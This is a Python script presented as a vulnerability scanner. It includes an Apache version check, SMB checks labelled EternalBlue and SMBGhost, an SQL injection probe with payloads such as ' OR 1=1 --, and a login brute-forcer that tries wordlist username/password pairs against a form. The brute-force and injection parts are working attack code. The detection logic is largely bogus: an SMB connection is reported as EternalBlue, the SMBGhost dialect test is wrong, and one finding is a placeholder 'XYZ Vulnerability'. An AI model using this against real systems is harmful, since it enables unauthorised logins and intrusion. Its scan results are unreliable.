#!/usr/bin/python3

# Scanner Vulnerability tool done by https://github.com/Sxmpl3

import requests
from impacket.smbconnection import SMBConnection


def apache():

    target_url = input("Target URL: ")

    response = requests.get(target_url)
    headers = response.headers

    if 'Server' in headers and 'Apache' in headers['Server']:

        server_version = headers['Server']

        if '2.4.18' in server_version:

            print("Apache server has XYZ Vulnerability")

        else:

            print("")
            print("Apache server not vulberable")


def smb():

    print("")
    target_ip = input("Target IP: ")

    def EternalBlue():

        try:

            smb_client = SMBConnection('', '', '', '')
            smb_client.connect(target_ip, 139, timeout=2)

            print("")
            print("EternalBlue Vulnerability found")

        except Exception as e:

            if str(e).find("STATUS_LOGON_FAILURE") != -1:

                print("")
                print("The target isn't vulnerable to EternalBlue")

            else:

                print("")
                print("EternalBlue Scan error")

    def SMBGhost():

        try:

            smb_client = SMBConnection('', '', '', '')
            smb_client.connect(target_ip, 445, timeout=2)

            dialect = smb_client.getDialect()

            if dialect >= smb_client.SMB2_DIALECT_3_1_1:

                print("")
                print("SMBGhost Vulnerability found")

            else:

                print("")
                print("The target isn't vulnerable to SMBGhost")

        except Exception:

            print("")
            print("SMBGhost Scan error")

    EternalBlue()
    SMBGhost()


def sqli():

    payloads = ["' OR 1=1 --", "' OR 'a'='a"]

    for payload in payloads:

        url = input("Target URL: ")
        parameter = input("Parametrer: ")

        target_url = f"{url}?{parameter}={payload}"
        response = requests.get(target_url)

        if "error" in response.text.lower():

            print("")
            print(f"SQL Injection vulnerability detected at: {target_url}")

        else:

            print("")
            print("No SQLI")


def bf():

    target_url = input("Target URL: ")
    user_parameter = input("User parameter: ")
    pswd_parameter = input("Password parameter: ")

    users_d = "users.txt"
    pswd_d = "passwords.txt"

    with open(users_d, 'r') as user_file:

        users = user_file.read().splitlines()

    with open(pswd_d, 'r') as pswd_file:

        passwords = pswd_file.read().splitlines()

    session = requests.Session()

    for user in users:

        for password in passwords:

            login_data = {

                user_parameter: user,
                pswd_parameter: password
            }

            response = session.post(target_url, data=login_data)

            if "incorrect" not in response.text.lower():

                print("")
                print(f"Successful login - Username: {user}, Password: {password}")

                return

    print("")
    print("Brute force attack failed")


def main():

    print("")
    print("Scanner Vulnerability | Done by Sxmpl3 (https://github.com/Sxmpl3)")
    print("--------------------------------------------------------------------")
    print("1 --> Basic Apache Scan")
    print("")
    print("2 --> SMB")
    print("")
    print("3 --> Web Scan")
    print("")

    select = input("Select one: ")

    if select == "1":

        apache()

    elif select == "2":
        
        smb()

    elif select == "3":

        print("")
        print("///// 1 --> Basic SQLI")
        print("")
        print("///// 2 --> Basic BruteForce")
        print("")

        select2 = input("Select one: ")

        if select2 == "1":
            
            sqli()

        elif select2 == "2":

            bf()


if __name__ == '__main__':

    main()

# Done by Sxmpl3.